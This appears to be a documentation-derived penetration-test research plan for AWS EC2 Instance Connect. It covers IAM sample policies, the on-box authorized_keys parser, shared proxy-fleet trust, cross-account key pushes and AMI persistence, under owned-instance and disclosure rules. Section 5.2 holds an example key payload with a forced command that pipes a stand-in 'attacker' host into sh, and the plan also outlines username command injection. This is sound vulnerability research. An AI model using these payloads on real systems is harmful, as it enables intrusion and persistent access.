# EC2 Instance Connect (Linux, public IP + EIC) — Attack Research Plan

**Target page:** `https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/connect-linux-inst-eic.html`
**Source of leads (offline mirror `/work/aws-docs/docs/AWSEC2/latest/UserGuide/`, cross-checked online 2026-09-10):**
`connect-linux-inst-eic.md` (hub) + its whole sub-tree — `ec2-instance-connect-prerequisites`, `ec2-instance-connect-configure-IAM-role`, `ec2-instance-connect-set-up`, `ec2-instance-connect-methods`, `ec2-instance-connect-tutorial`, `ec2-instance-connect-uninstall` — plus the adjacent EICE chapter (`connect-using-eice`, `eice-security-groups`, `eice-slr`, `eice-quotas`, `permissions-for-ec2-instance-connect-endpoint`), `monitor-with-cloudtrail` (EIC section), and the IAM reference `list_amazonec2instanceconnect`.

**Status:** Documentation-derived hypotheses only. Nothing tested against a live account.

> **Relationship to the existing plan.** A deep API-reference plan already exists at `/work/aws-docs/ec2-instance-connect-attack-research-plan.md` (the two `Send*SSHPublicKey` data-plane APIs + EICE `OpenTunnel` proxy, at the wire/SigV4 level). **This plan is the UserGuide-connection-flow companion** to it — it does not restate the API-wire leads; it concentrates on what *this* page-tree adds: the **IAM sample-policy artifacts** (`ec2:osuser` + wildcard `Describe*`), the **on-instance `eic_*` parser scripts** that turn API input into `authorized_keys`, the **console `oneclickv2-proxy` fleet + AWS-managed prefix-list SG trust**, the **60-second IMDS key window**, and **install-time footguns**. Hunter should read both; cross-references to the API plan are marked `[API-plan §X]`.

---

## 0. How to use this document
- Each lead: **Claim → Mechanism (doc evidence) → Confirm/Refute oracle → Preconditions / Cost → Severity-if-true → Stop condition.** Work in priority order (§5). Look left and right for adjacent bugs.
- **HARD STOP / disclosure trigger:** the instant evidence shows you have reached an identity, credential, ARN, host, or network belonging to **AWS's own service plane** — the shared `prod.<region>.oneclickv2-proxy.ec2.aws.dev` WebSocket fleet, the multi-tenant EICE proxy fleet, another tenant's tunnel/session, or the SLR's control path — **stop, preserve evidence, flag for AWS-Security disclosure.** Do not pivot further.
- Test only against instances/accounts you own. Use throwaway ED25519/RSA keypairs and canary instances; the pushed key auto-expires in 60 s.

---

## 1. Pentest Objectives (boundary-breach goals, as concrete outcomes)
1. **OS-user gate break:** obtain OS access as a user the `ec2:osuser` condition should have blocked (e.g. push a key "for `ec2-user`" but land a shell as `root`, or defeat the StringEquals with case/format variants) — the condition is the *only* thing scoping which OS account you authenticate as.
2. **On-instance parser escape:** craft the `--ssh-public-key` material (key comment / options / embedded newlines / username `%u`) so the on-box `eic_parse_authorized_keys` / `eic_run_authorized_keys %u %f` writes attacker-controlled `authorized_keys` **directives** (`command=`, `environment=`, an extra key) or shells out — turning a 60-second public-key push into persistence or code-exec beyond the single intended key.
3. **Ownership-vs-existence IDOR:** push a key (or open a tunnel) to an instance in another account/tenant named only by ID/ARN — is `SendSSHPublicKey` bound to instance *ownership* or just *existence*? [API-plan §5-A].
4. **Prefix-list / shared-fleet trust abuse:** the console path requires the target SG to allow SSH *from the AWS-managed EIC prefix list* (= the shared multi-tenant EIC service IP ranges). Determine whether opening that rule exposes the instance to **any** AWS customer's EIC console session, gated only by whether IAM `SendSSHPublicKey` at push-time is the sole isolator — and whether the `oneclickv2-proxy` fleet keeps tenants isolated.
5. **Doc-vs-enforcement / doc-vs-tooling gaps:** confirm whether the `ec2-instance-connect:remotePort` / `privateIpAddress` / `maxTunnelDuration` condition keys are actually enforced (docs promise "results in a failure"), and record the observed **tooling blind spot** where an IAM/policy summarizer omits these service-specific keys entirely.
6. **Install-time footgun / audit gap:** exploit the documented "if `AuthorizedKeysCommand` was pre-configured, install won't change it" behavior (silent-disable / hijack), and check whether any connect path produces **no** `ec2-instance-connect.amazonaws.com` CloudTrail record.

---

## 2. Components, Assets, and Design

### 2.1 Customer-facing interfaces (this page-tree)
- **EC2 Instance Connect data-plane API** — `ec2-instance-connect:SendSSHPublicKey` pushes an SSH **public** key for a named `InstanceOSUser` to the target instance; the key **lives 60 seconds in instance metadata (IMDS)**, then is removed. (Serial-console twin `SendSerialConsoleSSHPublicKey` and the wire details are in [API-plan §2].)
- **Console (browser) path** — browser opens a **WebSocket on 443** to the shared, AWS-managed **`prod.<region>.oneclickv2-proxy.ec2.aws.dev`** proxy fleet (China: `…ec2.a2z.org.cn`). Requires the instance to have a public IPv4/IPv6 address (or, for private IP, an EICE). "oneclickv2" implies a superseded v1 → [Lens N].
- **CLI path** — `aws ec2-instance-connect ssh --instance-id …` (wrapper; `--connection-type auto|direct|eice`). `auto` = Public-IPv4 `direct` → Private-IPv4 `eice` → IPv6 `direct`. Also `send-ssh-public-key` (bring-your-own-key) and `open-tunnel` (EICE ProxyCommand).
- **EICE (private-IP) path** — identity-aware TCP proxy, action `ec2-instance-connect:OpenTunnel`, condition keys `remotePort` / `privateIpAddress` / `maxTunnelDuration`. Deep leads in [API-plan §5]; this plan references it where the connect-flow docs add detail.

### 2.2 Processes / hosts / fleets behind the interface
- **On-instance package** `aws-ec2-instance-connect-config` (GitHub `aws/aws-ec2-instance-connect-config`; pre-installed on AL2023/AL2/Ubuntu/macOS current AMIs). Installing it rewrites sshd:
  - `AuthorizedKeysCommand /opt/aws/bin/eic_run_authorized_keys %u %f`
  - `AuthorizedKeysCommandUser ec2-instance-connect`
  - Scripts in `/opt/aws/bin/` (or `/usr/share/ec2-instance-connect/` on Ubuntu): **`eic_run_authorized_keys`**, **`eic_curl_authorized_keys`**, **`eic_parse_authorized_keys`**. On every SSH auth attempt sshd invokes the command **as system user `ec2-instance-connect`**, passing `%u` (requested login user) and `%f` (key fingerprint); the scripts curl the pushed key from IMDS, parse/validate it, and emit an `authorized_keys` line for sshd. **This is the untrusted-input parser that converts API input into on-box `authorized_keys`.**
- **EIC service** `ec2-instance-connect.amazonaws.com` — validates IAM (`SendSSHPublicKey` + `ec2:osuser`) and delivers the key toward the instance's IMDS.
- **`oneclickv2-proxy` fleet** — shared AWS-managed WebSocket proxy fronting the console browser terminal; multi-tenant (**service-plane, hard-stop zone**).
- **EICE proxy fleet + `AWSServiceRoleForEC2InstanceConnect` SLR** (managed policy `Ec2InstanceConnectEndpoint`) — creates/manages the endpoint ENI in the customer subnet. [Lens R audit below + API-plan.]

### 2.3 Assets / identifiers
- **Instance ARN** `arn:aws:ec2:<region>:<acct>:instance/i-…` — the authz resource for `SendSSHPublicKey`. Account is embedded → ownership must be checked, not just existence.
- **`InstanceOSUser`** (`--instance-os-user`) — string matched against `ec2:osuser`. Username rules (prereqs page): first char `[A-Za-z0-9_]`; later chars `[A-Za-z0-9@._-]`; **1–31 chars**. The `@ . _ -` set and the 31-char cap are the interesting attack alphabet for §5.2.
- **Pushed SSH public key blob** — attacker-authored text (key type + base64 + optional comment/options). The parser is supposed to reduce it to one clean key. [§5.2]
- **AWS-managed prefix lists** `com.amazonaws.<region>.ec2-instance-connect` (IPv4) / `…ipv6.ec2-instance-connect` (IPv6) — the SG "source" that anchors console-path trust.

### 2.4 ASCII connection diagram
```
                              (IAM: ec2-instance-connect:SendSSHPublicKey + ec2:osuser)
 Caller (IAM princ.) ──SigV4──► ec2-instance-connect.<region>.amazonaws.com ──push key──► IMDS (60s TTL)
        │                                                                                     ▲
        │ (console)                                                                           │ curl as user
        └─WSS:443─► prod.<region>.oneclickv2-proxy.ec2.aws.dev ──SSH:22──► sshd ── AuthorizedKeysCommand
                     [SHARED AWS FLEET - hard stop]     ▲ (SG allows           /opt/aws/bin/eic_run_authorized_keys %u %f
                                                        │  from EIC prefix       (runs as system user 'ec2-instance-connect')
                                                        │  list = shared IPs)       │ eic_curl → eic_parse (untrusted key blob)
 (private IP) Caller ─OpenTunnel─► EICE proxy (SLR ENI) ┘                           ▼
              remotePort/privateIpAddress/maxTunnelDuration cond keys        authorized_keys line → sshd auth as %u
```

---

## 3. API / Interface Inventory

| Name | Method | New/Exist | Mutating | Internal/External | Functionality | From Internet | Authorized callers | Notes |
|---|---|---|---|---|---|---|---|---|
| `ec2-instance-connect:SendSSHPublicKey` | SigV4 | Exist | **Yes** (writes key to instance) | External | Push public key for `InstanceOSUser`; 60 s IMDS TTL | Yes | IAM princ. w/ action on instance ARN + `ec2:osuser` | Res=`instance`; cond `ec2:osuser`,`ec2:SourceIp`. Prime IDOR + osuser target |
| `ec2-instance-connect:OpenTunnel` | non-SDK IAM action | Exist | Yes (opens TCP) | External | EICE identity-aware TCP proxy | Yes | IAM princ. w/ action on instance/endpoint | cond `remotePort`,`privateIpAddress`,`maxTunnelDuration`,`ec2:osuser`,`ec2:SourceIp`. [API-plan] |
| `ec2:DescribeInstances` | SigV4 | Exist | No | External | Console wrapper prerequisite | Yes | Sample policy grants on `Resource:"*"` | No resource-level perms → forced wildcard (§5.1) |
| `ec2:DescribeVpcs` | SigV4 | Exist | No | External | Needed for IPv6 console connect | Yes | Sample policy grants on `Resource:"*"` | Same forced-wildcard note |
| Console WSS proxy | WebSocket/443 | Exist | Yes (session) | **External→shared fleet** | Browser terminal via `oneclickv2-proxy` | Yes | Console user | Shared multi-tenant fleet — hard-stop zone |
| on-instance `AuthorizedKeysCommand` | local exec | Exist | Yes (auth) | Internal (on box) | `eic_run_authorized_keys %u %f` as `ec2-instance-connect` | No | sshd | The parser boundary (§5.2) |
| `AWSServiceRoleForEC2InstanceConnect` (SLR) | IAM role | Exist | — | Internal | EICE ENI mgmt; policy `Ec2InstanceConnectEndpoint` | — | `ec2-instance-connect.amazonaws.com` | Lens R audit (§5.6) |

**Undocumented/tooling-hidden knob (recorded):** an IAM policy-summary tool consulted during recon (fast model over the service-authorization page) reported that EIC defines **no** service-specific condition keys — yet the authoritative `permissions-for-ec2-instance-connect-endpoint` page defines three (`remotePort`, `privateIpAddress`, `maxTunnelDuration`). Any downstream tool with that blind spot cannot reason about, or generate, least-privilege OpenTunnel policies → see §5.5.

---

## 4. Trust-Boundary Map

| From (actor / zone) | To (resource / zone) | Crossing mechanism | Breach oracle |
|---|---|---|---|
| Caller IAM principal | Instance in **another account** | `SendSSHPublicKey` by ARN | A push succeeds against an instance ARN whose account you do not own = cross-account breach |
| Caller (authorized for `ec2-user`) | **`root`/other OS user** on same instance | `ec2:osuser` condition + on-box `%u` mapping | A shell as an OS user the `ec2:osuser` StringEquals should have blocked |
| Attacker-authored key blob | On-box `authorized_keys` (untrusted → trusted) | `eic_parse_authorized_keys` | Any directive/second key/command reaching `authorized_keys` beyond the one intended key = parser escape |
| Any AWS customer's EIC console session | Your instance's SSH:22 | SG rule "allow from EIC prefix list" | An SSH connection reaching your instance sourced from the shared EIC fleet **without** a matching authorized `SendSSHPublicKey` push in your account |
| Console browser session | `oneclickv2-proxy` shared fleet / peer tenant | WSS:443 | Reaching the proxy host, another tenant's WSS session, or a control interface on the shared fleet = **hard stop** |
| Data path (established SSH/tunnel) | EICE proxy fleet / control ENI | OpenTunnel TCP | Any packet to a host other than the intended instance on the shared fleet [API-plan] |
| Any customer surface | **AWS service plane** | any of the above | Any AWS-owned identity/credential/ARN/host = **hard stop, disclose** |

---

## 5. Recommended Areas of Focus (priority order)

### 5.1 — AWS-authored IAM sample-policy artifacts: forced `Resource:"*"` and osuser scoping (Lens R / S / U) — PRIORITY
**Background.** `ec2-instance-connect-configure-IAM-role` prints two verbatim sample policies customers copy. Both pair a scoped `SendSSHPublicKey` statement with a **second statement granting `ec2:DescribeInstances` + `ec2:DescribeVpcs` on `Resource:"*"`**, explicitly because "`ec2:Describe*` … do not support resource-level permissions. Therefore, the `*` wildcard is necessary."
**Security Concern.** The AWS-published artifact forces an account-wide `Describe*` read grant onto every EIC user — an information-disclosure floor AWS's own doc induces (not a customer footgun; the customer is told to copy it). Separately, audit whether the `ec2:osuser` StringEquals is the *only* scoping on `SendSSHPublicKey`: the ABAC variant uses `aws:ResourceTag/<key>` on `instance/*` — is that tag ownership-bound or presence-bound? [Lens S].
**High-level Test Scenarios (falsifiable claims):**
- *Claim:* holding **only** the printed policy, a principal can enumerate every instance/VPC in the account (blast radius wider than "connect to two instances"). *Oracle:* `iam:SimulatePrincipalPolicy` for `DescribeInstances` on `*` returns Allow under the scoped role; escalate to a live `describe-instances` only with canary data.
- *Claim:* the ABAC `aws:ResourceTag/tag-key` grant lets a holder who can **self-set that tag** widen their own SSH reach. *Oracle:* under a role holding the sample policy + `ec2:CreateTags`, tag a foreign-but-visible instance and confirm `SendSSHPublicKey` now passes (prove tag-set + connect in one run). If `CreateTags` is denied, blast radius is bounded — record the null.
- *Claim:* `ec2:osuser` StringEquals is **case-sensitive fail-open** — a Deny/Allow written for lowercase `ec2-user` is inert if the request field is normalized differently on the box. *Oracle:* push with `--instance-os-user EC2-User` / `Ec2-User` and compare authz + resulting login. [Variant: Lens S case-sensitivity fail-open.]
**Doc evidence:** `ec2-instance-connect-configure-IAM-role.md` (both JSON blocks + the "`*` wildcard is necessary" sentences). **Severity-if-true:** account-wide Describe floor = Low–Medium (AWS-authored, reportable Tier 2); self-tag ABAC widen = Medium–High. **Stop:** on any AWS-owned resource, halt.

### 5.2 — On-instance `eic_*` parser: `authorized_keys` options injection & `%u %f` handling (Lens F / Q) — PRIORITY
**Background.** sshd runs `AuthorizedKeysCommand /opt/aws/bin/eic_run_authorized_keys %u %f` as system user `ec2-instance-connect`; the scripts (`eic_curl_authorized_keys` → `eic_parse_authorized_keys`) fetch the **attacker-authored** pushed key from IMDS and emit an `authorized_keys` line. `%u` is the login username the client requests, `%f` the key fingerprint.
**Security Concern.** OpenSSH `authorized_keys` lines carry optional leading **options** (`command="…"`, `environment="…"`, `permitopen=`, `no-pty`, another whole key on a new line). If the key blob a caller sends via `--ssh-public-key` is not strictly reduced to `<type> <base64> [safe-comment]`, an attacker who is *authorized to connect at all* can smuggle a forced-command / persistent second key that outlives the 60-second push. The parse/validate logic is exactly what stands between the API input and sshd. Source is auditable: GitHub `aws/aws-ec2-instance-connect-config`.
**High-level Test Scenarios:**
- *Claim:* a pushed key whose text is `command="curl attacker|sh" ssh-ed25519 AAAA…` (or has a trailing `\n<second key>`) is written to `authorized_keys` with the option intact / the second key retained. *Oracle:* push such a blob for an instance you own, then inspect what sshd actually authorizes (does a forced command run? does the extra key work after 60 s?). Refute if `eic_parse_authorized_keys` strips options and rejects multi-line/oversize blobs.
- *Claim:* `%u` (login username) reaches a shell/`eval`/unquoted path inside `eic_run_authorized_keys` → command/path injection when a username uses the allowed `@ . _ -` set or a crafted 31-char string. *Oracle:* read the script; attempt login as a username containing shell metacharacters permitted by the 1–31 char rule and observe the command's behavior. [Variant Lens F: OS-command injection in a service-owned exec.]
- *Claim:* the IMDS fetch (`eic_curl_authorized_keys`) trusts an attacker-influenced IMDS response length/format → parser hang or over-read. *Oracle:* review; check IMDSv2 token handling and response-size bounds.
**Doc evidence:** `ec2-instance-connect-set-up.md` (`AuthorizedKeysCommand … %u %f`, `AuthorizedKeysCommandUser ec2-instance-connect`, the three scripts); `ec2-instance-connect-prerequisites.md` (username rules). **Severity-if-true:** forced-command / persistent key = High (post-auth persistence / privilege beyond intent); command injection as `ec2-instance-connect` user = High. **Stop:** stays on your own instance — safe to fully PoC.

### 5.3 — Prefix-list SG trust + shared `oneclickv2-proxy` fleet (Lens U / V / AA + confused deputy) — PRIORITY
**Background.** Console-path prereq: create an SG that "allows inbound SSH traffic from the EC2 Instance Connect service," by selecting the **AWS-managed prefix list** `com.amazonaws.<region>.ec2-instance-connect` as Source. That rule opens SSH:22 to the *entire shared EIC service IP range* used by all customers.
**Security Concern.** The network ACL is deliberately broad (a shared-fleet CIDR); the *only* per-instance authorization is the IAM `SendSSHPublicKey` check at push time and whatever the shared `oneclickv2-proxy` fleet enforces. If push-time IAM is not the sole isolator, or if the proxy fleet mis-routes, an instance with this rule is reachable by another tenant's console session. This is the classic "trust an AWS-managed shared source range" seam.
**High-level Test Scenarios:**
- *Claim:* with the prefix-list SG rule in place, an instance is SSH-reachable from the shared fleet **independent of** whether a valid `SendSSHPublicKey` push exists in the owner's account (network reach ≠ auth, but tests fleet isolation). *Oracle:* from a second account you control, attempt to drive an EIC console/CLI session toward the first account's instance IP; success without an authorized push in the target account = isolation break (**hard stop / disclose**).
- *Claim:* the prefix list is broader than needed (covers Regions/paths the instance never uses). *Oracle:* resolve the managed prefix-list entries; compare to the documented per-Region endpoint. [Lens U doc-vs-mechanism.]
- *Claim:* revoking the prefix-list rule / disabling console access leaves a stale reachability path (Lens AA revocation completeness). *Oracle:* after removing the rule, retry the console path.
**Doc evidence:** `ec2-instance-connect-prerequisites.md` ("traffic from the EC2 Instance Connect service … managed through prefix lists", endpoint `prod.<region>.oneclickv2-proxy.ec2.aws.dev`); `ec2-instance-connect-tutorial.md` Task 2. **Severity-if-true:** cross-tenant SSH reach on shared fleet = High–Critical. **Stop:** the moment you touch the shared proxy host / another tenant — preserve & disclose.

### 5.4 — `SendSSHPublicKey` ownership-vs-existence & the `--availability-zone` field (Lens A / X)
**Background.** The BYO-key flow passes `--instance-id`, `--availability-zone`, `--instance-os-user`, `--ssh-public-key`. Authz resource is the instance ARN (account embedded).
**Security Concern.** Does the service bind the push to instance **ownership** or merely **existence**? Does the caller-supplied `--availability-zone` participate in authz or only in routing (a body field that names a locus the credential doesn't scope)? Instance IDs are structured/enumerable.
**High-level Test Scenarios:**
- *Claim:* `SendSSHPublicKey` against a foreign-account instance ID returns success/leaks a distinguishable not-found-vs-denied oracle. *Oracle:* from account A, push to a known account-B instance ID; compare error codes/latency for existent-foreign vs nonexistent IDs (enumeration oracle). Treat `DryRun` as caller-IAM only, **not** an ownership oracle. [Variant Lens A: 500/400/200 behavior oracle.]
- *Claim:* an `--availability-zone` mismatched to the real AZ still succeeds → the field is not authorization-bearing. *Oracle:* push with a wrong AZ.
- *Claim:* the serial-console twin `SendSerialConsoleSSHPublicKey` enforces different/looser scoping than `SendSSHPublicKey` (Lens X action-family parity). *Oracle:* compare both against the same foreign ID. [Deep wire detail: API-plan §5.]
**Doc evidence:** `ec2-instance-connect-methods.md` (`send-ssh-public-key` example params). **Severity-if-true:** cross-account = Critical; enumeration oracle = Low–Medium. **Stop:** on cross-account success, disclose.

### 5.5 — OpenTunnel condition-key enforcement + tooling blind spot (Lens U / S)
**Background.** EICE `OpenTunnel` supports `ec2-instance-connect:remotePort`, `:privateIpAddress`, `:maxTunnelDuration`; docs promise each "results in a failure" when violated. A policy-summary tool consulted during recon reported these keys **do not exist**.
**Security Concern.** (a) Are the promises enforced — can a tunnel reach a port/IP/duration the policy forbids? (b) The tooling blind spot means least-privilege OpenTunnel policies generated by that class of tool silently omit the port/IP scoping → over-broad tunnels. Also, `privateIpAddress` binds the *destination IP*; does it bind the **right** resource (the instance actually connected to) or a value the caller can decouple from the instance ID (Lens S wrong-resource binding)?
**High-level Test Scenarios:**
- *Claim:* with a policy scoping `remotePort:22`, an `open-tunnel --remote-port 3389` (or arbitrary port) still connects. *Oracle:* attempt the disallowed port; expect AccessDenied if enforced. [Deep enumeration: API-plan.]
- *Claim:* `privateIpAddress` CIDR gate can be satisfied by a foreign instance sharing the CIDR while `instance-id` names another (naming decouple). *Oracle:* craft mismatched `--instance-id` vs `--private-ip-address`.
- *Claim (informational):* IAM tooling omits `ec2-instance-connect:*` condition keys → mis-generated policies. *Oracle:* documented divergence between the fast-model summary and `permissions-for-ec2-instance-connect-endpoint.md`; record as doc-vs-tooling.
**Doc evidence:** `permissions-for-ec2-instance-connect-endpoint.md` lines defining the three keys + example policies. **Severity-if-true:** port/IP gate bypass = High; tooling omission = Informational (but enables over-broad grants).

### 5.6 — SLR `Ec2InstanceConnectEndpoint` managed-policy audit (Lens R)
**Background.** Creating an EICE auto-creates `AWSServiceRoleForEC2InstanceConnect` (trusts `ec2-instance-connect.amazonaws.com`, policy `Ec2InstanceConnectEndpoint`) to "create and manage network interfaces in your account."
**Security Concern.** Does the SLR's *actually attached* policy exceed ENI create/manage — e.g. unconditioned `ec2:CreateNetworkInterface` / attach across subnets, or actions unrelated to its stated purpose?
**High-level Test Scenarios:** *Claim:* the resolved policy grants more than ENI lifecycle. *Oracle:* `iam:GetPolicyVersion` on the managed policy ARN; audit statement-by-statement for wildcards/missing conditions. **Doc evidence:** `eice-slr.md`. **Severity-if-true:** over-broad SLR = Medium (AWS-owned, Tier 2).

### 5.7 — Install-time footgun & audit coverage (Lens U / O)
**Background.** Install docs repeat: "If you previously configured `AuthorizedKeysCommand`/`AuthorizedKeysCommandUser`, the EC2 Instance Connect installation will not change the values and you can't use EC2 Instance Connect." CloudTrail records `SendSSHPublicKey` under `ec2-instance-connect.amazonaws.com`.
**Security Concern.** (a) A pre-seeded malicious `AuthorizedKeysCommand` (baked into a shared AMI) survives EIC install and is *never* overwritten → supply-chain persistence masquerading as EIC. (b) Are there connect paths (BYO-key SSH, EICE data plane after tunnel open) that produce **no** `ec2-instance-connect` CloudTrail event, or where the logged `sourceIPAddress`/`userAgent` is spoofable (Lens O)?
**High-level Test Scenarios:**
- *Claim:* an AMI with a pre-set `AuthorizedKeysCommand` pointing at an attacker script is not remediated by `yum install ec2-instance-connect`, and its command runs on SSH auth. *Oracle:* bake it, install EIC, observe which command sshd uses. [Chains with `connect-to-linux-instance` shared-AMI supply-chain leads — see [[project_connect-linux-instance-plan]].]
- *Claim:* the SSH-session phase (after key push) is invisible to CloudTrail (only the push is logged) → post-connection actions have no EIC audit trail. *Oracle:* connect, act, diff CloudTrail. **Doc evidence:** `ec2-instance-connect-set-up.md` Notes; `monitor-with-cloudtrail.md` EIC section. **Severity-if-true:** AMI persistence = High (customer-config, but AWS-doc-acknowledged behavior); audit gap = Low/Informational enabler.

### 5.8 — 60-second IMDS key window (Lens A, low)
**Background.** The pushed **public** key sits in instance metadata for 60 s; the on-box script reads it from IMDS.
**Security Concern.** Any process on the instance that can reach IMDS can read the transient public key and the requested OS user during the window — a public key is low-value, but the *presence + target OS user* is a signal of an in-flight admin connection, and confirms IMDS reachability/version. *Oracle:* from a low-priv process on the instance, read the IMDS EIC key path during a push; confirm IMDSv1-vs-v2 gating. **Severity:** Low (public key only) — record, don't over-rate.

---

## 6. Threat Model Test Objectives

| Threat / Test Case | Component | Documented mitigation to attack |
|---|---|---|
| Cross-account key push (IDOR) | `SendSSHPublicKey` | Instance ARN in Resource (ownership must be enforced, not existence) |
| OS-user gate break (root) | `ec2:osuser` + on-box `%u` map | StringEquals `ec2:osuser` == AMI default user |
| `authorized_keys` options/2nd-key injection | `eic_parse_authorized_keys` | Parser reduces blob to one clean key (unverified) |
| Command injection via `%u`/`%f` | `eic_run_authorized_keys` | Runs as low-priv `ec2-instance-connect` user (containment, not prevention) |
| Cross-tenant SSH via prefix-list SG | Managed prefix list + `oneclickv2-proxy` fleet | IAM push-time auth + fleet isolation (shared range is broad) |
| OpenTunnel port/IP/duration bypass | EICE `OpenTunnel` | `remotePort`/`privateIpAddress`/`maxTunnelDuration` conditions |
| Forced-wildcard Describe over-read | Sample IAM policy | "`*` necessary" for `ec2:Describe*` (AWS-authored artifact) |
| Pre-set AuthorizedKeysCommand hijack | On-instance install | Install "will not change" existing values (documented, un-remediated) |
| Audit evasion | CloudTrail `ec2-instance-connect.amazonaws.com` | Only the push is logged; session phase not |

---

## 7. Out-of-Scope Risk Categories
- **Shared `oneclickv2-proxy` / EICE proxy fleet internals** beyond proving an isolation breach — on any AWS-owned host/identity, **hard stop & disclose**; do not weaponize.
- **IMDS on managed/customer hosts** as a generic finding (in-scope only for the specific 60 s public-key window test, §5.8).
- **Customer-authored** IAM policies that over-grant (footgun) — only the **AWS-published sample policies** (§5.1) and **AWS-managed SLR policy** (§5.6) are in scope.
- Single-tenant self-DoS; a user connecting to their *own* instance as intended; third-party SSH client bugs; general EC2 key-pair / lost-key flows (covered by [[project_connect-linux-instance-plan]]).
- Deep SigV4/wire-frame fuzzing of the two `Send*` APIs and full EICE `OpenTunnel` enumeration — owned by `/work/aws-docs/ec2-instance-connect-attack-research-plan.md`; do not duplicate.

## 8. Null Hypotheses / Doc Gaps
- **Lens H (KMS/encryption-context):** N/A — read all seven sub-pages + EICE chapter; EIC uses no customer CMK, no encryption context. Null.
- **Lens K (prompt injection):** N/A — no LLM/agent in the connect path. (The separate "See also / AI-agent skills" injected block that appears on *API-reference* pages is **absent** from these UserGuide pages — see [[project_aws-docs-see-also-injection]]; recorded, not executed.)
- **Lens J (OAuth/3P):** N/A — no third-party identity linking; auth is pure SigV4 IAM. Read prerequisites + IAM-role pages.
- **Lens W (attestation):** N/A — no Nitro attestation gate on this path.
- **Doc gap — on-instance parser:** the exact validation/stripping logic of `eic_parse_authorized_keys` is not in the docs; §5.2 requires reading GitHub `aws/aws-ec2-instance-connect-config` (or reading the installed script on a canary box) before the parser-escape leads can be confirmed — mark "doc-gap — confirm surface first."
- **Doc gap — fleet isolation:** the docs assert the console proxy is an AWS service but do not describe per-tenant isolation on `oneclickv2-proxy`; §5.3's cross-tenant test is the way to confirm the surface.
- **Doc-vs-tooling divergence (recorded, §5.5):** an IAM policy-summary tool reported EIC has no service-specific condition keys; the authoritative permissions page defines three. Informational, AWS-ecosystem-owned.

---
*End of plan. Companion to `/work/aws-docs/ec2-instance-connect-attack-research-plan.md` (API-wire depth) and `connect-to-linux-instance` hub plan (shared-AMI / key-pair supply chain).*
